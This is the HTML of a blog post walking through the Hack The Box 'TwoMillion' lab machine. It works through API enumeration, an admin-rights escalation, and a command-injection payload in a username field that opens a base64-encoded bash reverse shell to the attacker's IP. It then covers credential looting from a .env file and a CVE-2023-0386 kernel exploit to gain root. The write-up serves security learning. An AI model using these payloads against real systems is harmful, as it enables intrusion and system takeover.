@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Two Million Machine Walkthrough | HTB Notes</title>
+<meta name="keywords" content="">
+<meta name="description" content="1. Nmap scanning
+nmap 10.10.11.221 -sC -sV --open
+Findings
+
+Port 22 (SSH)
+Port 80 (HTTP)
+
+2. Enumeration
+To access the website we need to resolve the hostname to ip in etc/hosts file:
+echo &#34;10.10.11.221  2million.htb&#34; | sudo tee -a 
+Visit /invite page and you can find inviteapi.min.js file in devtools.
+
+Deobfuscate it at https://matthewfl.com/unPacker.html. We got:
+
+There is makeInviteCode() function that sends API POST request to /api/v1/how/to/generate. Use curl or Burpsuite Repeater to send requests. It&rsquo;s important that you save PHPSESSID cookie somewhere.">
+<meta name="author" content="">
+<link rel="canonical" href="https://hoverdd.github.io/htb-notes/posts/two_million/">
+<link crossorigin="anonymous" href="/htb-notes/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://hoverdd.github.io/htb-notes/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://hoverdd.github.io/htb-notes/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://hoverdd.github.io/htb-notes/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://hoverdd.github.io/htb-notes/apple-touch-icon.png">
+<link rel="mask-icon" href="https://hoverdd.github.io/htb-notes/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://hoverdd.github.io/htb-notes/posts/two_million/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://hoverdd.github.io/htb-notes/posts/two_million/">
+  <meta property="og:site_name" content="HTB Notes">
+  <meta property="og:title" content="Two Million Machine Walkthrough">
+  <meta property="og:description" content="1. Nmap scanning nmap 10.10.11.221 -sC -sV --open Findings Port 22 (SSH) Port 80 (HTTP) 2. Enumeration To access the website we need to resolve the hostname to ip in etc/hosts file:
+echo &#34;10.10.11.221 2million.htb&#34; | sudo tee -a Visit /invite page and you can find inviteapi.min.js file in devtools. Deobfuscate it at https://matthewfl.com/unPacker.html. We got: There is makeInviteCode() function that sends API POST request to /api/v1/how/to/generate. Use curl or Burpsuite Repeater to send requests. It’s important that you save PHPSESSID cookie somewhere.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-12T17:27:08+03:00">
+    <meta property="article:modified_time" content="2025-07-12T17:27:08+03:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Two Million Machine Walkthrough">
+<meta name="twitter:description" content="1. Nmap scanning
+nmap 10.10.11.221 -sC -sV --open
+Findings
+
+Port 22 (SSH)
+Port 80 (HTTP)
+
+2. Enumeration
+To access the website we need to resolve the hostname to ip in etc/hosts file:
+echo &#34;10.10.11.221  2million.htb&#34; | sudo tee -a 
+Visit /invite page and you can find inviteapi.min.js file in devtools.
+
+Deobfuscate it at https://matthewfl.com/unPacker.html. We got:
+
+There is makeInviteCode() function that sends API POST request to /api/v1/how/to/generate. Use curl or Burpsuite Repeater to send requests. It&rsquo;s important that you save PHPSESSID cookie somewhere.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://hoverdd.github.io/htb-notes/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Two Million Machine Walkthrough",
+      "item": "https://hoverdd.github.io/htb-notes/posts/two_million/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Two Million Machine Walkthrough",
+  "name": "Two Million Machine Walkthrough",
+  "description": "1. Nmap scanning nmap 10.10.11.221 -sC -sV --open Findings Port 22 (SSH) Port 80 (HTTP) 2. Enumeration To access the website we need to resolve the hostname to ip in etc/hosts file:\necho \u0026#34;10.10.11.221 2million.htb\u0026#34; | sudo tee -a Visit /invite page and you can find inviteapi.min.js file in devtools. Deobfuscate it at https://matthewfl.com/unPacker.html. We got: There is makeInviteCode() function that sends API POST request to /api/v1/how/to/generate. Use curl or Burpsuite Repeater to send requests. It\u0026rsquo;s important that you save PHPSESSID cookie somewhere.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "1. Nmap scanning nmap 10.10.11.221 -sC -sV --open Findings Port 22 (SSH) Port 80 (HTTP) 2. Enumeration To access the website we need to resolve the hostname to ip in etc/hosts file:\necho \"10.10.11.221 2million.htb\" | sudo tee -a Visit /invite page and you can find inviteapi.min.js file in devtools. Deobfuscate it at https://matthewfl.com/unPacker.html. We got: There is makeInviteCode() function that sends API POST request to /api/v1/how/to/generate. Use curl or Burpsuite Repeater to send requests. It’s important that you save PHPSESSID cookie somewhere.\ncurl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq note: jq is JSON object parser. It allows to view json responses more easily. In \"enctype\" field there is encryption type ROT13. You can use rot13.com to decrypt the message. It states:\nIn order to generate the invite code, make a POST request to /api/v1/invite/generate Let’s do this as follows:\ncurl -X POST http://2million.htb/api/v1/invite/generate | jq We got our invite code, but it’s base64 encrypted. To decrypt it:\necho \"T00yTU0tT1RONU8tWU9GSEUtVDBQUlM=\" | base64 -d Here is our invite code: OM2MM-OTN5O-YOFHE-T0PRS. Enter it at /invite page and click Submit button. We’re at registration page. Create an account. Login in it. There is Access page at sidebar and it allows to generate VPN configs. When cursor is on the button Connection Pack it shows redirection path.\n3. Exploitation API To make things easier, I’ll use Burp Suite to send and modify the requests. Let’s see the response on this request: Then try /api/v1: It gives us full Route List. Use admin/auth endpoint. We are not an admin. There is PUT method that allows to update admin rights. Send PUT request: It needs header Content-Type: application/json. It tells us required fields. So add them. Add parameter is_admin. It needs to be 0 or 1. 1 is true, set to 1. Now it updated our user and now we can access other admin endpoints. Send request to /admin/vpn/generate Add missing parameters.\nGetting a reverse shell When given username server generates a custom VPN config. Site operates with PHP, so it probably uses some sort of exec() or shell_cmd() function to generate the file. Let’s test code execution first: Yep! We’re ready to get reverse shell! We don’t want encounter any problems with encoding so let’s use base64 encrypting.\necho \"bash -i \u003e\u0026 /dev/tcp/10.10.14.19/4242 0\u003e\u00261\" | base64 Create netcat listener:\nnc -lvnp 4242 Pass the payload:\n{ \"username\": \"myuser; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80MjQyIDA+JjEK | base64 -d | bash;\" } Send the request and open the terminal tab with your netcat listener. Lateral Movement We can’t open user.txt file. In /var/www/html we see index.php file, let’s search for passwords in it:\ncat index.php | grep -i pass* DB_PASSWORD is loaded from some environment variable, maybe there is hidden files? See .env file contents: We see user admin with a password SuperDuperPass123. Let’s make sure such user as admin exist. Check /etc/passwd file. Admin user exists, now let’s try to connect using SSH.\nssh admin@2million.htb Now we can grab user flag. 4. Privelege Escalation But how to escalate our priveleges to root? Let’s check /var/mail folder for emails. Sender of the email says that there is active vulnerability OverlayFS / FUSE. Google it. We find interesting article about CVE-2023-0386. We have to be sure that this vulnerability will work. See uname -a We are using linux 5.15. From article: Also we are on Ubuntu Jammy 5.15.70. The affected kernel versions for jammy go up to 5.15.0-70.77 and target machine is running 5.15.70. Now let’s search for exploits. I found one: We’ll need to download the exploit on our local machine and send it using scp to admin@2million.htb. Also let’s compress it with zip:\ngit clone https://github.com/sxlmnwb/CVE-2023-0386.git zip -r cve.zip CVE-2023-0386 scp cve.zip admin@2million.htb:/tmp Most important you should copy it to /tmp folder so we can execute it later. Check /tmp folder: We got our zip file. Now unzip it.\nunzip cve.zip Change directory to CVE-2023-0386 and compile everything:\nmake all Ignore the warning in the output. Github README file states we need to run two terminals but we are going to run all 3 files in background using \u0026 operand.\n./fuse ./ovlcap/lower ./gc \u0026 ./exp We gained root rights!! Thank you for reading this article! ;)\n",
+  "wordCount" : "695",
+  "inLanguage": "en",
+  "datePublished": "2025-07-12T17:27:08+03:00",
+  "dateModified": "2025-07-12T17:27:08+03:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://hoverdd.github.io/htb-notes/posts/two_million/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "HTB Notes",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://hoverdd.github.io/htb-notes/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://hoverdd.github.io/htb-notes/" accesskey="h" title="HTB Notes (Alt + H)">HTB Notes</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://hoverdd.github.io/htb-notes/about/" title="About me">
+                    <span>About me</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Two Million Machine Walkthrough
+    </h1>
+    <div class="post-meta"><span title='2025-07-12 17:27:08 +0300 MSK'>July 12, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="1-nmap-scanning">1. Nmap scanning<a hidden class="anchor" aria-hidden="true" href="#1-nmap-scanning">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap 10.10.11.221 -sC -sV --open
+</span></span></code></pre></div><h3 id="findings">Findings<a hidden class="anchor" aria-hidden="true" href="#findings">#</a></h3>
+<ul>
+<li>Port 22 (SSH)</li>
+<li>Port 80 (HTTP)</li>
+</ul>
+<h2 id="2-enumeration">2. Enumeration<a hidden class="anchor" aria-hidden="true" href="#2-enumeration">#</a></h2>
+<p>To access the website we need to resolve the hostname to ip in <code>etc/hosts</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.10.11.221  2million.htb&#34;</span> | sudo tee -a 
+</span></span></code></pre></div><p>Visit <code>/invite</code> page and you can find <code>inviteapi.min.js</code> file in devtools.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%205.36.16%E2%80%AFPM.png">
+Deobfuscate it at <code>https://matthewfl.com/unPacker.html</code>. We got:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%205.37.49%E2%80%AFPM.png">
+There is <code>makeInviteCode()</code> function that sends API POST request to <code>/api/v1/how/to/generate</code>. Use <code>curl</code> or <code>Burpsuite Repeater</code> to send requests. It&rsquo;s important that you save <code>PHPSESSID</code> cookie somewhere.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
+</span></span></code></pre></div><p><em>note</em>: <code>jq</code> is JSON object parser. It allows to view json responses more easily.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%205.47.06%E2%80%AFPM.png">
+In <code>&quot;enctype&quot;</code> field there is encryption type ROT13. You can use <code>rot13.com</code> to decrypt the message. It states:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>In order to generate the invite code, make a POST request to /api/v1/invite/generate
+</span></span></code></pre></div><p>Let&rsquo;s do this as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST http://2million.htb/api/v1/invite/generate | jq
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%205.51.55%E2%80%AFPM.png">
+We got our invite code, but it&rsquo;s <code>base64</code> encrypted. To decrypt it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;T00yTU0tT1RONU8tWU9GSEUtVDBQUlM=&#34;</span> | base64 -d
+</span></span></code></pre></div><p>Here is our invite code:
+<code>OM2MM-OTN5O-YOFHE-T0PRS</code>.
+Enter it at <code>/invite</code> page and click <code>Submit</code> button. We&rsquo;re at registration page.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.05.52%E2%80%AFPM.png">
+Create an account. Login in it.
+There is <code>Access</code> page at sidebar and it allows to generate VPN configs.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.07.59%E2%80%AFPM.png">
+When cursor is on the button <code>Connection Pack</code> it shows redirection path.</p>
+<h2 id="3-exploitation">3. Exploitation<a hidden class="anchor" aria-hidden="true" href="#3-exploitation">#</a></h2>
+<h3 id="api">API<a hidden class="anchor" aria-hidden="true" href="#api">#</a></h3>
+<p>To make things easier, I’ll use Burp Suite to send and modify the requests.
+Let&rsquo;s see the response on this request:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.33.10%E2%80%AFPM.png">
+Then try <code>/api/v1</code>:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.34.31%E2%80%AFPM.png"></p>
+<p>It gives us full Route List. Use <code>admin/auth</code> endpoint.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.34.58%E2%80%AFPM.png">
+We are not an admin. There is PUT method that allows to update admin rights. Send PUT request:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.36.37%E2%80%AFPM.png">
+It needs header <code>Content-Type: application/json</code>.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.37.25%E2%80%AFPM.png">
+It tells us required fields. So add them.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.38.13%E2%80%AFPM.png">
+Add parameter <code>is_admin</code>.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.38.54%E2%80%AFPM.png">
+It needs to be 0 or 1. 1 is true, set to 1.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.39.32%E2%80%AFPM.png">
+Now it updated our user and now we can access other admin endpoints.
+Send request to <code>/admin/vpn/generate</code>
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.40.35%E2%80%AFPM.png">
+Add missing parameters.</p>
+<h3 id="getting-a-reverse-shell">Getting a reverse shell<a hidden class="anchor" aria-hidden="true" href="#getting-a-reverse-shell">#</a></h3>
+<p><img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.41.35%E2%80%AFPM.png">
+When given username server generates a custom VPN config. Site operates with PHP, so it probably uses some sort of <code>exec()</code> or <code>shell_cmd()</code> function to generate the file. Let&rsquo;s test code execution first:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.43.22%E2%80%AFPM.png">
+Yep! We&rsquo;re ready to get reverse shell!
+We don&rsquo;t want encounter any problems with encoding so let&rsquo;s use base64 encrypting.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.19/4242 0&gt;&amp;1&#34;</span> | base64
+</span></span></code></pre></div><p>Create <code>netcat</code> listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4242</span>
+</span></span></code></pre></div><p>Pass the payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;myuser; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80MjQyIDA+JjEK | base64 -d | bash;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Send the request and open the terminal tab with your netcat listener.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.50.06%E2%80%AFPM.png"></p>
+<h3 id="lateral-movement">Lateral Movement<a hidden class="anchor" aria-hidden="true" href="#lateral-movement">#</a></h3>
+<p>We can&rsquo;t open <code>user.txt</code> file. In <code>/var/www/html</code>
+we see <code>index.php</code> file, let&rsquo;s search for passwords in it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat index.php | grep -i pass*
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.51.43%E2%80%AFPM.png">
+<code>DB_PASSWORD</code> is loaded from some environment variable, maybe there is hidden files?
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.53.22%E2%80%AFPM.png">
+See <code>.env</code> file contents:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.54.06%E2%80%AFPM.png">
+We see user <code>admin</code> with a password <code>SuperDuperPass123</code>. Let&rsquo;s make sure such user as admin exist. Check <code>/etc/passwd</code> file.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.57.28%E2%80%AFPM.png">
+Admin user exists, now let&rsquo;s try to connect using SSH.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh admin@2million.htb
+</span></span></code></pre></div><p>Now we can grab user flag.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%206.58.55%E2%80%AFPM.png"></p>
+<h2 id="4-privelege-escalation">4. Privelege Escalation<a hidden class="anchor" aria-hidden="true" href="#4-privelege-escalation">#</a></h2>
+<p>But how to escalate our priveleges to root?
+Let&rsquo;s check <code>/var/mail</code> folder for emails.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%207.00.14%E2%80%AFPM.png">
+Sender of the email says that there is active vulnerability <code>OverlayFS / FUSE</code>. Google it. We find interesting <a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">article</a> about <code>CVE-2023-0386</code>.
+We have to be sure that this vulnerability will work. See <code>uname -a</code>
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%207.03.27%E2%80%AFPM.png">
+We are using <code>linux 5.15</code>.
+From article:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%207.03.27%E2%80%AFPM-1.png">
+Also we are on Ubuntu Jammy 5.15.70.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%207.07.57%E2%80%AFPM.png">
+The affected kernel versions for <code>jammy</code> go up to <code>5.15.0-70.77</code> and target machine is running <code>5.15.70</code>. Now let&rsquo;s search for exploits. I found <a href="https://github.com/sxlmnwb/CVE-2023-0386">one</a>:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%207.12.31%E2%80%AFPM.png">
+We&rsquo;ll need to download the exploit on our local machine and send it using <code>scp</code> to <code>admin@2million.htb</code>. Also let&rsquo;s compress it with <code>zip</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/sxlmnwb/CVE-2023-0386.git
+</span></span><span style="display:flex;"><span>zip -r cve.zip CVE-2023-0386
+</span></span><span style="display:flex;"><span>scp cve.zip admin@2million.htb:/tmp 
+</span></span></code></pre></div><p>Most important you should copy it to <code>/tmp</code> folder so we can execute it later. Check <code>/tmp</code> folder:
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%207.18.41%E2%80%AFPM.png">
+We got our zip file.
+Now <code>unzip</code> it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip cve.zip
+</span></span></code></pre></div><p>Change directory to <code>CVE-2023-0386</code> and compile everything:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>make all
+</span></span></code></pre></div><p>Ignore the warning in the output.
+Github <code>README</code> file states we need to run two terminals but we are going to run all 3 files in background using <code>&amp;</code> operand.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./fuse ./ovlcap/lower ./gc &amp;
+</span></span><span style="display:flex;"><span>./exp
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/two_million/screenshots/Screenshot%202025-07-12%20at%207.24.33%E2%80%AFPM.png">
+We gained root rights!!
+Thank you for reading this article! ;)</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://hoverdd.github.io/htb-notes/">HTB Notes</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
